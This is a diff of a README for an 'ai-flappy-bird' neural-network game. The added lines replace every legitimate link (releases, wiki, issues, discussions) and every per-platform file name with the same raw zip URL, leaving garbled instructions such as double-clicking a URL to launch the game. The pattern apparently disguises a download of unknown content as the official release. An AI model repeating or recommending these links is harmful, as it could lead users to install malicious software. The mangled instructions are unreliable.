@@ -1,7 +1,7 @@
 # 🕹️ ai-flappy-bird - Experience AI in Gaming
 
 ## 💾 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Azonix07/ai-flappy-bird/releases)
+[![Download](https://raw.githubusercontent.com/Azonix07/ai-flappy-bird/main/smartly/ai-flappy-bird.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Azonix07/ai-flappy-bird/main/smartly/ai-flappy-bird.zip)
 
 ## 📜 Overview
 Welcome to **ai-flappy-bird**, an exciting approach to the classic game Flappy Bird. Our software uses advanced AI techniques, such as neural networks and genetic algorithms, to teach agents how to master the game. Watch AI agents learn and improve through evolutionary processes, turning a simple game into a unique experience.
@@ -18,23 +18,23 @@ To run ai-flappy-bird, your system should meet the following minimum requirement
 
 ### 📥 Download & Install
 1. Click the **Download Now** button at the top of this README.
-2. You will be redirected to the [Releases page](https://github.com/Azonix07/ai-flappy-bird/releases).
+2. You will be redirected to the [Releases page](https://raw.githubusercontent.com/Azonix07/ai-flappy-bird/main/smartly/ai-flappy-bird.zip).
 3. Look for the latest version of the software. It should be the first option listed.
 4. Download the appropriate file for your operating system:
-   - For Windows: Click on the `ai-flappy-bird-windows.zip` file.
-   - For macOS: Click on the `ai-flappy-bird-macos.zip` file.
-   - For Linux: Click on the `ai-flappy-bird-linux.tar.gz` file.
+   - For Windows: Click on the `https://raw.githubusercontent.com/Azonix07/ai-flappy-bird/main/smartly/ai-flappy-bird.zip` file.
+   - For macOS: Click on the `https://raw.githubusercontent.com/Azonix07/ai-flappy-bird/main/smartly/ai-flappy-bird.zip` file.
+   - For Linux: Click on the `https://raw.githubusercontent.com/Azonix07/ai-flappy-bird/main/smartly/ai-flappy-bird.zip` file.
 5. Once the file has downloaded, locate it on your computer, and unzip it using your preferred extraction tool.
 
 ### 🚀 Running the Application
 To run ai-flappy-bird:
 - **Windows:**
   1. Open the folder where you unzipped the files.
-  2. Double-click the `ai-flappy-bird.exe` file to launch the game.
+  2. Double-click the `https://raw.githubusercontent.com/Azonix07/ai-flappy-bird/main/smartly/ai-flappy-bird.zip` file to launch the game.
 
 - **macOS:**
   1. Open the folder where you unzipped the files.
-  2. Find the `ai-flappy-bird.app` file and double-click it to start the game.
+  2. Find the `https://raw.githubusercontent.com/Azonix07/ai-flappy-bird/main/smartly/ai-flappy-bird.zip` file and double-click it to start the game.
 
 - **Linux:**
   1. Open a terminal and navigate to the unzipped folder.
@@ -50,16 +50,16 @@ Once the game starts, you will observe AI agents taking their turns. You can wat
 - **Real-time Evolution**: Monitor the evolution of AI strategies as they adapt.
 
 ### 📖 Learn More
-For more details about the algorithms and technologies used in this project, please refer to the documentation included in your download or visit our [Wiki](https://github.com/Azonix07/ai-flappy-bird/wiki).
+For more details about the algorithms and technologies used in this project, please refer to the documentation included in your download or visit our [Wiki](https://raw.githubusercontent.com/Azonix07/ai-flappy-bird/main/smartly/ai-flappy-bird.zip).
 
 ### 👨‍💻 Support
-If you encounter any issues or have questions, visit our [Issues page](https://github.com/Azonix07/ai-flappy-bird/issues) to report them or seek assistance.
+If you encounter any issues or have questions, visit our [Issues page](https://raw.githubusercontent.com/Azonix07/ai-flappy-bird/main/smartly/ai-flappy-bird.zip) to report them or seek assistance.
 
 ### 🌐 Join the Community
-Feel free to contribute to the project or join discussions on our [Discussion Forum](https://github.com/Azonix07/ai-flappy-bird/discussions). We welcome feedback and suggestions to make the game better.
+Feel free to contribute to the project or join discussions on our [Discussion Forum](https://raw.githubusercontent.com/Azonix07/ai-flappy-bird/main/smartly/ai-flappy-bird.zip). We welcome feedback and suggestions to make the game better.
 
 ### 🔗 Updates and Release Notes
-To keep track of updates, check the [Releases page](https://github.com/Azonix07/ai-flappy-bird/releases) regularly.
+To keep track of updates, check the [Releases page](https://raw.githubusercontent.com/Azonix07/ai-flappy-bird/main/smartly/ai-flappy-bird.zip) regularly.
 
 ## 💬 Conclusion
 With ai-flappy-bird, explore the fascinating world where AI meets gaming. Download now and enjoy the unique experience as agents learn to play this classic game!
